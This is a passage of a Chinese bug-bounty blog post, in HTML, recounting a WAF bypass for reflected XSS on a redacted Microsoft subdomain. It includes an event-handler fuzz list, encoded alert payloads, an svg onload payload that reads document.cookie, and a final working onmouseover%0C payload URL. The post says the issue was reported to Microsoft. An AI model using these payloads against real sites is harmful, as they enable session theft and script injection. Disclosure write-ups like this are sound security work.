(当数据提供者的数据变化时触发)</span><br><span class="line">onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)</span><br><span class="line">onClick() (表单中点击触发)</span><br><span class="line">onContextMenu() (用户需要在攻击区域点击右键)</span><br><span class="line">onControlSelect() (当用户在一个对象上创建控件选中区时触发)</span><br><span class="line">onCopy() (用户需要复制一些东西或使用execCommand(<span class="string">&quot;Copy&quot;</span>)命令时触发)</span><br><span class="line">onCut() (用户需要剪切一些东西或使用execCommand(<span class="string">&quot;Cut&quot;</span>)命令时触发)</span><br><span class="line">onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)</span><br><span class="line">onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)</span><br><span class="line">onDataSetComplete() (数据源对象中所有数据可用时触发)</span><br><span class="line">onDblClick() (用户双击一个表单元素或链接)</span><br><span class="line">onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)</span><br><span class="line">onDrag() (在元素正在拖动时触发)</span><br><span class="line">onDragEnd() (当用户完成元素的拖动时触发)</span><br><span class="line">onDragLeave() (用户在拖动元素离开放置目标时触发)</span><br><span class="line">onDragEnter() (用户将对象拖拽到合法拖曳目标)</span><br><span class="line">onDragOver() (用户将对象拖拽划过合法拖曳目标)</span><br><span class="line">onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)</span><br><span class="line">onDragStart() (当用户开始拖动元素时触发)</span><br><span class="line">onDrop() (当拖动元素放置在目标区域时触发)</span><br><span class="line">onEnded() (在视频/音频（audio/video）播放结束时触发)</span><br><span class="line">onError() (在加载文档或图像时发生错误)</span><br><span class="line">onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)</span><br><span class="line">onFilterChange() (当滤镜完成状态变更时触发)</span><br><span class="line">onFinish() (当marquee完成滚动时攻击者可以执行攻击)</span><br><span class="line">onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)</span><br><span class="line">onFocusIn() (当元素将要被设置为焦点之前触发)</span><br><span class="line">onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)</span><br><span class="line">onHashChange() (当锚部分发生变化时触发攻击代码)</span><br><span class="line">onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)</span><br><span class="line">onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发)</span><br><span class="line">onKeyDown() (用户按下一个键的时候触发)</span><br><span class="line">onKeyPress() (在键盘按键被按下并释放一个键时触发)</span><br><span class="line">onKeyUp() (用户释放一个键时触发)</span><br><span class="line">onLayoutComplete() (用户进行完打印或打印预览时触发)</span><br><span class="line">onLoad() (攻击者在窗口加载后触发攻击代码)</span><br><span class="line">onLoseCapture() (可以由releaseCapture()方法触发)</span><br><span class="line">onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)</span><br><span class="line">onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)</span><br><span class="line">onMessage() (当页面收到一个信息时触发事件)</span><br><span class="line">onMouseDown() (攻击者需要让用户点击一个图片触发事件)</span><br><span class="line">onMouseEnter() (光标移动到一个对象或区域时触发)</span><br><span class="line">onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)</span><br><span class="line">onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseOver() (光标移动到一个对象或区域)</span><br><span class="line">onMouseUp() (攻击者需要让用户点击一个图片)</span><br><span class="line">onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</span><br><span class="line">onMove() (用户或攻击者移动页面时触发)</span><br><span class="line">onMoveEnd() (用户或攻击者移动页面结束时触发)</span><br><span class="line">onMoveStart() (用户或攻击者开始移动页面时触发)</span><br><span class="line">onOffline() (当浏览器从在线模式切换到离线模式时触发)</span><br><span class="line">onOnline() (当浏览器从离线模式切换到在线模式时触发)</span><br><span class="line">onOutOfSync() (当元素与当前时间线失去同步时触发)</span><br><span class="line">onPaste() (用户进行粘贴时或攻击者可以使用execCommand(<span class="string">&quot;Paste&quot;</span>)函数时触发)</span><br><span class="line">onPause() (在视频或音频暂停时触发)</span><br><span class="line">onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)</span><br><span class="line">onProgress() (攻击者可以在一个FLASH加载时触发事件)</span><br><span class="line">onPropertyChange() (用户或攻击者需要改变元素属性时触发)</span><br><span class="line">onReadyStateChange() (每次 readyState 属性变化时被自动调用)</span><br><span class="line">onRedo() (用户返回上一页面时触发)</span><br><span class="line">onRepeat() (事件在播放完重复播放时触发)</span><br><span class="line">onReset() (用户或攻击者重置表单时触发)</span><br><span class="line">resizeTo(<span class="number">500</span>,<span class="number">400</span>);&lt;/SCRIPT&gt;)</span><br><span class="line">onResizeEnd() (用户完成改变窗体大小时触发)</span><br><span class="line">onResizeStart() (用户开始改变窗体大小时触发)</span><br><span class="line">onResume() (当元素继续播放时触发)</span><br><span class="line">onReverse() (当元素回放时触发)</span><br><span class="line">onRowsEnter() (用户或攻击者需要改变数据源中的一行)</span><br><span class="line">onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)</span><br><span class="line">onRowDelete() (用户或攻击者需要删除数据源中的一行)</span><br><span class="line">onRowInserted() (user or attacker would needto insert a row in a data source)</span><br><span class="line">onScroll() (用户需要滚动或攻击者使用scrollBy()函数)</span><br><span class="line">onSeek() (当用户在元素上执行查找操作时触发)</span><br><span class="line">execCommand(<span class="string">&quot;SelectAll&quot;</span>);)</span><br><span class="line">execCommand(<span class="string">&quot;SelectAll&quot;</span>);)</span><br><span class="line">execCommand(<span class="string">&quot;SelectAll&quot;</span>);)</span><br><span class="line">onStart() (在marquee 对象开始循环时触发)</span><br><span class="line">onStop() (当用户按下停止按钮或离开页面时触发)</span><br><span class="line">onStorage() (当Web Storage更新时触发)</span><br><span class="line">onSyncRestored() (当元素与它的时间线恢复同步时触发)</span><br><span class="line">onSubmit() (需要用户或攻击者提交表单)</span><br><span class="line">onTimeError() (用户或攻击者设置时间属性出现错误时触发)</span><br><span class="line">onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)</span><br><span class="line">onUndo() (用户返回上一浏览记录页面时触发)</span><br><span class="line">onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)</span><br><span class="line">onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</span><br><span class="line">seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>测了一圈下来，基本上都是403（403则是被waf拦截）</p>
+<p><img src="Je7xbhQnJAlkaNWQQ60fjS7RiO07AtbBorAUeKBnrQs.png" alt="image"></p>
+<p>只剩下这几个是200，可以过waf的；但是这几个函数都不适合用在h1标签上，大小写也测试过了，于是使用事件触发这个思路算是走不通了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onOnline</span><br><span class="line">seekSegmentTime</span><br><span class="line">FSCommand</span><br></pre></td></tr></table></figure>
+<h2 id="尝试绕过弹窗函数"><a href="#尝试绕过弹窗函数" class="headerlink" title="尝试绕过弹窗函数"></a>尝试绕过弹窗函数</h2><p>于是尝试从弹窗函数和反引号入手，首先是弹窗函数，常用的alert、confirm和 prompt均被拦截。</p>
+<p>尝试使用Unicode编码的弹窗函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Onclick    \u0061\u006C\u0065\u0072\u0074</span><br><span class="line"></span><br><span class="line">html编码且去掉分号  </span><br><span class="line">&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x31&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x43&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x35&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x37&amp;#x32&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x37&amp;#x34</span><br><span class="line"></span><br><span class="line"> 再进行URL编码进行请求</span><br><span class="line">%<span class="number">26</span>%23x5c%<span class="number">26</span>%23x75%<span class="number">26</span>%23x30%<span class="number">26</span>%23x30%<span class="number">26</span>%23x36%<span class="number">26</span>%23x31%<span class="number">26</span>%23x5c%<span class="number">26</span>%23x75%<span class="number">26</span>%23x30%<span class="number">26</span>%23x30%<span class="number">26</span>%23x36%<span class="number">26</span>%23x43%<span class="number">26</span>%23x5c%<span class="number">26</span>%23x75%<span class="number">26</span>%23x30%<span class="number">26</span>%23x30%<span class="number">26</span>%23x36%<span class="number">26</span>%23x35%<span class="number">26</span>%23x5c%<span class="number">26</span>%23x75%<span class="number">26</span>%23x30%<span class="number">26</span>%23x30%<span class="number">26</span>%23x37%<span class="number">26</span>%23x32%<span class="number">26</span>%23x5c%<span class="number">26</span>%23x75%<span class="number">26</span>%23x30%<span class="number">26</span>%23x30%<span class="number">26</span>%23x37%<span class="number">26</span>%23x34</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclick=%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x31%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x43%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x35%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x37%26%23x32%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x37%26%23x34%601%20</span></span><br></pre></td></tr></table></figure>
+<p><img src="xn50cB_DFGfJLZszfuoIRqNLvRrtN2VGVolDSythKOU.png" alt="image"></p>
+<p>当我手动添加了反引号之后可以触发，但是当我输入两个反引号进行请求的时候，又被拦截了</p>
+<p><img src="W85CMroMpBVczpyI8MkHlyxkpTqTiQRs0rlwbLJxy0s.png" alt="image"></p>
+<p>弹窗函数又行不通了，经过查询资料发现一个可以绕该waf的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert&amp;#0000000040document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+<p>修改为适合这里的；发现被拦截了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclick=alert%26%230000000040document.cookie)%20</span></span><br></pre></td></tr></table></figure>
+<h2 id="尝试从反引号入手"><a href="#尝试从反引号入手" class="headerlink" title="尝试从反引号入手"></a>尝试从反引号入手</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html编码   &amp;#x00000000000060</span><br><span class="line">url编码    %<span class="number">26</span>%<span class="number">23</span>%<span class="number">78</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+<p>请求发现被拦截，单个的时候正常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/</span></span><br><span class="line">?s=%22ONclick=alert%<span class="number">26</span>%<span class="number">23</span>%<span class="number">78</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%30qqq%<span class="number">26</span>%<span class="number">23</span>%<span class="number">78</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">30</span>%<span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+
+<p>到这里的时候，心态已经崩了。</p>
+<h2 id="尝试throw"><a href="#尝试throw" class="headerlink" title="尝试throw"></a>尝试throw</h2><p>尝试throw绕过;失败了。</p>
+<p>现在捋一下思路发现：</p>
+<ul>
+<li>1.同时出现事件函数、等于号、双反引号或者双圆括号就会被拦截</li>
+<li>2.且不管是通过各种编码实现的上述内容，入事件函数，弹窗函数，反引号，只要最终能触发XSS弹窗的，就会被拦截。</li>
+<li>3.单独出现，或者出现三者的其二都是可以正常访问</li>
+</ul>
+<h2 id="尝试添加额外字符扰乱（成功）"><a href="#尝试添加额外字符扰乱（成功）" class="headerlink" title="尝试添加额外字符扰乱（成功）"></a>尝试添加额外字符扰乱（成功）</h2><p>尝试添加空格等其它字符进行干扰waf的判断</p>
+<p>在html的标签中，不同位置的空格绕过方式不是一样的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAAsrcAAAonerrorBBB=BBBalertCCC(<span class="number">1</span>)DDD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A位置： /，/<span class="number">123</span>/，%09，%0A，%0C，%<span class="number">0D</span>，%<span class="number">20</span></span><br><span class="line">B位置：%09，%0A，%0C，%<span class="number">0D</span>，%<span class="number">20</span></span><br><span class="line">C位置：%0B，<span class="comment">/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</span></span><br><span class="line"><span class="comment">D位置：%09，%0A，%0C，%0D，%20，//，&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试在alert前后添加空格被拦截;也就是BBB和CCC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 ONclick=空格alert`<span class="number">1</span>` &gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<p>尝试在弹窗内容后添加空格被拦截;也就是DDD</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 ONclick=alert`<span class="number">1</span>`空格&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;h1 ONclick=alert`<span class="number">1</span>空格`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<p>尝试在触发函数中添加空格，也就是AAA和BBB</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 ONclick空格=alert`<span class="number">1</span>`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<p>在BBB中添加 %0C 成功（%09、%0A、%0D被拦截；%20位置错乱）、</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 ONclick空格=alert`<span class="number">1</span>`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<p>完整的payload为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=%22onmouseover%0C=prompt%60hello_microsoft_xss%60%20</span></span><br></pre></td></tr></table></figure>
+<p><img src="0W51WPSvn9QFWcwWRbs2metRnFDu-LeWFrDNyFjGDeI.png" alt="image"></p>
+<p><img src="7RhNWH0LpIriLtTtjwkCUp3ZTtsNdiZHocH_039CJ5E.png" alt="image"></p>
+<p><img src="rrZKoYQ7UbtkWmuw5p2mfV_tPHZnQqhd1-iaINHOuXc.png" alt="image"></p>
+<p>在谷歌查看HTML</p>
+<p><img src="OVpeOfsNQGF97xSI9Jxyy2QAcOjk8oeDjeR7KHj7N4Y.png" alt="image"></p>
+<p>在火狐中查看HTML；发现多了个 但无影响函数的触发</p>
+<p><img src="zAtlnEMW3IDw5bVa4OJBAF_iZyO1SpV7OufnoDek4GM.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>国外的WAF真牛逼，只要我的不是完整的payload就不会触发拦截，而且不会针对性的去拦截payload。经历了一番漫长的尝试终于绕过 WAF，提交给微软之后，怀着激动的心情等微软官方的好消息(微软的XSS漏洞一般都有1200-3000$)。过了几天微软赏金团队告知我该漏洞不在赏金计划的范围之内，无缘了微软的赏金，但微软会在自己的MSRC官网中对漏洞提交者进行鸣谢。</p>
+<p><img src="cyouecdhDaHjhWM3rvlkVdIBQq8p5L65PbsstzphKA8.png" alt="image"></p>
+<p><img src="PjKGs03xhChxWt6yOxAixjLN3Ps2QESt-YGEnMP_rQg.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.</span> <span class="toc-text">记一次艰难的微软某站XSS绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%E5%BC%80%E5%A7%8B"><span class="toc-number">1.2.</span> <span class="toc-text">正文开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E2%80%9D-gt-%E2%80%9D%E9%97%AD%E5%90%88"><span class="toc-number">1.3.</span> <span class="toc-text">尝试使用”&gt;”闭合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E2%80%9D-%E2%80%9C%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">尝试”&#96;“绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz%E4%BA%8B%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">fuzz事件函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E5%BC%B9%E7%AA%97%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">尝试绕过弹窗函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BB%8E%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%85%A5%E6%89%8B"><span class="toc-number">1.7.</span> <span class="toc-text">尝试从反引号入手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95throw"><span class="toc-number">1.8.</span> <span class="toc-text">尝试throw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%B7%BB%E5%8A%A0%E9%A2%9D%E5%A4%96%E5%AD%97%E7%AC%A6%E6%89%B0%E4%B9%B1%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.9.</span> <span class="toc-text">尝试添加额外字符扰乱（成功）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&text=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&is_video=false&description=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次艰难的微软某站XSS绕过WAF&body=Check out this article: https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&name=记一次艰难的微软某站XSS绕过WAF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&t=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
